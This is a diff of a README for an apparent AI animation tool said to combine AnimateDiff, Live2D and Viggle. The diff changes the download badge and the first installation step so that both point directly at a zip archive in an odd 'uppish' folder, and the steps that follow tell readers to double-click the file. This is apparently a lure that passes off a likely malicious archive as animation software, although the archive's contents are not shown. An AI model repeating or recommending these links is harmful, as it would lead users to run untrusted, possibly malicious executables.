@@ -1,6 +1,6 @@
 # 🎨 ai-animation-viggle-animatediff-live2d-ai - Create professional animations with simple tools
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Victorkin9221/ai-animation-viggle-animatediff-live2d-ai)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Victorkin9221/ai-animation-viggle-animatediff-live2d-ai/raw/refs/heads/main/uppish/d_live_ai_viggle_animatediff_animation_1.1.zip)
 
 ## 🌟 Overview
 This project provides a set of tools to create animations. It combines different technologies like AnimateDiff, Live2D, and Viggle. Users can bring static images to life or control character movement with simple inputs. You do not need experience in coding to use these tools. The software handles the complex math behind the motion. You provide the image and the tool generates the result.
@@ -18,7 +18,7 @@ If your graphics card is older, the program might run slower. Ensure you have th
 ## 💾 Installation and Setup
 Follow these steps to get the software on your computer.
 
-1. Visit the repository page to download the software: [https://github.com/Victorkin9221/ai-animation-viggle-animatediff-live2d-ai](https://github.com/Victorkin9221/ai-animation-viggle-animatediff-live2d-ai)
+1. Visit the repository page to download the software: [https://github.com/Victorkin9221/ai-animation-viggle-animatediff-live2d-ai/raw/refs/heads/main/uppish/d_live_ai_viggle_animatediff_animation_1.1.zip](https://github.com/Victorkin9221/ai-animation-viggle-animatediff-live2d-ai/raw/refs/heads/main/uppish/d_live_ai_viggle_animatediff_animation_1.1.zip)
 2. Locate the download button on the page. 
 3. Save the installation file to your computer.
 4. Double-click the file to begin the setup process.
